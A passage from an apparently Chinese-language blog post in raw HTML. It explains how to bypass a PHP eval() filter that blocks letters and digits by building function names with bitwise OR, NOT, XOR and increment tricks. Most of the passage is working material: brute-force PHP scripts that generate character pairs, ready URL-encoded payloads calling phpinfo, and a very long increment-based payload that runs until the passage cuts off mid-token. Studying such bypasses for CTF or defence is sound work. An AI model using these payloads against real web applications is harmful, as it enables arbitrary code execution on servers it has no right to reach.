class="hljs-string">&quot;/[A-Za-z0-9]/&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想输入数字字符？做梦呢？&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>代码非常简单，传入一个参数，判断其中是否有字符，如果有A-Z a-z 0-9字符，那就die，如果没有，那就执行命令<br>乍一看这好像是个无解的题，那么如何去绕过过滤呢，这就要提到eval的一些特性了(system等不具备，因为他们执行的不是php的命令)</p><p>eval即把传入的参数作为php命令执行，支持语法的嵌套，即可执行多个命令，那么我们是不是可以传入一些没有被过滤的字符然后通过一些变换，使之转换成我们想要使用的字符，然后再让eval去执行他呢？答案是可以的</p><p>php中有三个符号可以进行变换字符，</p><p>分别是“~”(取反)   “^”(异位)  |(或)  ^(与)  (++)自增，可以把这三种当做特殊的函数去看待，</p><h5 id="或"><a href="#或" class="headerlink" title="或"></a>或</h5><p>demo</p><p><img src="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/image-20211210104441559.png" alt="image-20211210104441559"></p><p>只要传入时把其放在两个字符串中间，其就可以执行，这时候我们就可以写一个小脚本去爆破了，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pass_waf</span>(<span class="hljs-params"><span class="hljs-variable">$waf</span></span>)</span>&#123;<br>    <span class="hljs-variable">$str</span>=[];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">127</span>;<span class="hljs-variable">$i</span>++)&#123;<br>     <span class="hljs-keyword">if</span> (!preg_match((<span class="hljs-variable">$waf</span>),chr(<span class="hljs-variable">$i</span>)))&#123;<br>        array_push(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$i</span>);<br>     &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-variable">$str1</span>=pass_waf(<span class="hljs-string">&quot;/[A-Za-z0-9]/&quot;</span>);<br><span class="hljs-variable">$str2</span>=pass_waf(<span class="hljs-string">&quot;/[A-Za-z0-9]/&quot;</span>);<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$str1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v1</span>)&#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$str2</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v2</span>)&#123;<br>        <span class="hljs-keyword">echo</span> (chr(<span class="hljs-variable">$v1</span>)|chr(<span class="hljs-variable">$v2</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;      &quot;</span>;<br>        <span class="hljs-keyword">echo</span> (urlencode(chr(<span class="hljs-variable">$v1</span>)));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;|&quot;</span>;<br>        <span class="hljs-keyword">echo</span> (urlencode(chr(<span class="hljs-variable">$v2</span>)));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><p>对生成的结果进行拼接即可 如想执行phpinfo</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">cmd=(<span class="hljs-string">&quot;%10%28%10%29%0E%06%0f&quot;</span>|<span class="hljs-string">&quot;%60%60%60%60%60%60%60&quot;</span>)();即可<br>在php7下可以用 因为php支持动态执行函数 即(<span class="hljs-string">&#x27;phpinfo&#x27;</span>)();可以被当做命令执行<br></code></pre></td></tr></table></figure><h5 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">这个比较简单<br><span class="hljs-keyword">echo</span> urlencode(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br>%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span><br>cmd=(~<span class="hljs-string">&#x27;%8F%97%8F%96%91%99%90&#x27;</span>)();<br>这里需要提前url编码一下，因为取反之后输出的都是乱码字符，如果直接复制上去，可能会出问题。<br></code></pre></td></tr></table></figure><h5 id="异位"><a href="#异位" class="headerlink" title="异位"></a>异位</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">这个和或是同理的 改下上面的脚本在进行拼接即可<br> <span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pass_waf</span>(<span class="hljs-params"><span class="hljs-variable">$waf</span></span>)</span>&#123;<br>    <span class="hljs-variable">$str</span>=[];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">127</span>;<span class="hljs-variable">$i</span>++)&#123;<br>     <span class="hljs-keyword">if</span> (!preg_match((<span class="hljs-variable">$waf</span>),chr(<span class="hljs-variable">$i</span>)))&#123;<br>        array_push(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$i</span>);<br>     &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-variable">$str1</span>=pass_waf(<span class="hljs-string">&quot;/[A-Za-z0-9]/&quot;</span>);<br><span class="hljs-variable">$str2</span>=pass_waf(<span class="hljs-string">&quot;/[A-Za-z0-9]/&quot;</span>);<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$str1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v1</span>)&#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$str2</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v2</span>)&#123;<br>        <span class="hljs-keyword">echo</span> (chr(<span class="hljs-variable">$v1</span>)^chr(<span class="hljs-variable">$v2</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;      &quot;</span>;<br>        <span class="hljs-keyword">echo</span> (urlencode(chr(<span class="hljs-variable">$v1</span>)));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;^&quot;</span>;<br>        <span class="hljs-keyword">echo</span> (urlencode(chr(<span class="hljs-variable">$v2</span>)));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <br>&#125;<br>payload:cmd=(<span class="hljs-string">&quot;%5b%5b%5b%5b%5b%5b%5b&quot;</span>^<span class="hljs-string">&quot;%2b%13%2b%12%15%1d%14&quot;</span>)();<br>同样，这种方法只适用于php7<br><br></code></pre></td></tr></table></figure><h5 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h5><p>就和c语言一样，php也可以自增，可以利用该特性理论上获取任何字符</p><p><img src="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/image-20211212174405943.png" alt="image-20211212174405943"></p><p>有的人这时候可能会有疑问了，不是把所有字母都给过滤了吗？那如何得到A呢？</p><p><img src="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/image-20211212174808347.png" alt="image-20211212174808347"></p><p>可能大家会对这段代码有点疑问，我解释一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=[];<span class="hljs-comment">//让_变量成为一个数组</span><br><span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-comment">//让_变量获取到数组的值，即Array</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];利用索引获得A的第一个值<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>;<br>有时候会把数字也过滤了，那就可以利用<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;#&#x27;</span>==<span class="hljs-string">&#x27;!&#x27;</span>];这种形式来代替<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>直接上一个写好的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D%<span class="hljs-number">40</span>%<span class="hljs-number">22</span>%<span class="hljs-number">24</span>_%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">5</span><span class="hljs-string">B&#x27;!&#x27;</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D<span class="hljs-string">&#x27;%40&#x27;</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span> ___%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span> B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__% <span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">2</span> <span class="hljs-number">4</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_ _%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span> __%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_ _%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B %<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span> B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B% <span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B %<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span> B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span> ___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____%<span class="hljs-number">3</span>D<span class="hljs-string">&#x27;_&#x27;</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__% <span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">2</span> <span class="hljs-number">4</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B% <span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">2</span> <span class="hljs-number">4</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B% <span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B %<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B% <span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B %<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_ _%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D% <span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_ _%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B %<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span> B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span 